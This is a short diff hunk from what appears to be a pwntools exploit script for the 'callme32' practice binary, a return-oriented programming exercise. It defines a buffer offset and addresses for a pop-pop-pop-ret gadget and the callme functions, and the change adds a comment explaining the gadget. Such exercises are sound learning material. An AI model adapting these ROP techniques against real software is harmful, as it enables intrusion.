@@ -5,9 +5,9 @@ p = process('./callme32')
 
 junkOffset = 0x28+0x4
 
-ROPPOP = p32(0x080487f9)
+ROPPOP = p32(0x080487f9)  #ROPgadget to pop 3 variables off the stack and return: pop xxx, pop xxx, pop xxx, ret
 
-callme1 = p32(0x080484f0)
+callme1 = p32(0x080484f0) 
 
 callme2 = p32(0x08048550)
 
